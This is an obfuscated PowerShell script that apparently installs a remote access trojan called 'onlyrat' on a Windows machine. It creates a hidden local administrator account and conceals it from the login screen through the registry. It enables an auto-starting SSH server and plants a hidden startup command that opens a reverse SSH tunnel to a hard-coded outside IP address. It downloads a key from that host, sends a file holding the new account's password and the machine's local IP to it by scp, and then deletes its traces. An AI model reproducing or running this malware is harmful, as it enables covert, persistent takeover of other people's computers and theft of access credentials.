# TODO: incorporate necessary payload installs

$KLZRuifR = "Delta Echo" # change me, vps username
$poGOhLRr = "195.35.32.34" # change me, vps ip address
$MhAtUUjV = "22" # change me, default vps port [default 22]
$mINVtRe = "2583" # change me, routed vps port [NOT TO DEFAULT SSH PORT]

$YtRBvrA = "$KLZRuifR@$poGOhLRr"

function JhDNRe {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
}

function VoPieGLLqw {
    [CmdletBinding()]
    param (
        [string] $sqbXFdLvyw,
        [securestring] $CBFXIYeWPR
    )
    begin {
    }
    process {
        New-LocalUser "$sqbXFdLvyw" -Password $CBFXIYeWPR -FullName "$sqbXFdLvyw" -Description "Temporary local admin"
        Write-Verbose "$sqbXFdLvyw local user crated"
        Add-LocalGroupMember -Group "Administrators" -Member "$sqbXFdLvyw"
        Write-Verbose "$sqbXFdLvyw added to the local administrator group"
    }
    end {
    }
}

# make admin
$XFgBAAx = "onlyrat"
$JsakIRo = JhDNRe
Remove-LocalUser -Name $XFgBAAx
$BHsFsnIP = (ConvertTo-SecureString $JsakIRo -AsPlainText -Force)
VoPieGLLqw -sqbXFdLvyw $XFgBAAx -CBFXIYeWPR $BHsFsnIP

# registry
# registry
$MFzgONo = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
$QueBEfkX = '00000000'

If (-NOT (Test-Path $MFzgONo)) {
  New-ItemProperty -Path $MFzgONo	-Force | Out-Null
}

New-ItemProperty -Path $MFzgONo -Name $XFgBAAx -Value $QueBEfkX -PropertyType DWORD -Force

# ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
New-Item -ItemType Directory -Path $env:USERPROFILE\.ssh
ssh-keyscan.exe -H $poGOhLRr >> $env:USERPROFILE\.ssh\known_hosts

# startup file
# TODO:  registry startup
$GlNweBEFmh = JhDNRe
$NyZnoLKCIs = Get-Location
Add-Content -Path "$NyZnoLKCIs/$GlNweBEFmh.cmd" -Value "@echo off"
Add-Content -Path "$NyZnoLKCIs/$GlNweBEFmh.cmd" -Value "powershell powershell.exe -windowstyle hidden -ep bypass `"ssh -o ServerAliveInterval=30 -o StrictHostKeyChecking=no -R $mINVtRe`:localhost:22 $YtRBvrA -i $env:temp\key`""

# rat file
$CRYnrkaDbe = "$env:UserName.rat"
$AhdjktGyiZ = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress

Add-Content -Path $CRYnrkaDbe -Value $AhdjktGyiZ # local ip addr
Add-Content -Path $CRYnrkaDbe -Value $JsakIRo # pass
Add-Content -Path $CRYnrkaDbe -Value $env:temp # temp
Add-Content -Path $CRYnrkaDbe -Value $NyZnoLKCIs # startup
Add-Content -Path $CRYnrkaDbe -Value $poGOhLRr # remote host
Add-Content -Path $CRYnrkaDbe -Value $mINVtRe # remote port
Add-Content -Path $CRYnrkaDbe -Value 'remote' # connection type

# get key and sent rat
Invoke-WebRequest -Uri "http://$poGOhLRr/key" -OutFile "$env:temp\key"
scp -P $MhAtUUjV -o StrictHostKeyChecking=no -i $env:temp\key -r $CRYnrkaDbe $YtRBvrA`:/home/$nkowFESgaO

# cleanup
Set-Location C:\Users
attrib +h +s +r onlyrat
Set-Location $NyZnoLKCIs
Remove-Item $CRYnrkaDbe
Remove-Item KFPGaEYdcz.ps1
start "./$GlNweBEFmh.cmd"
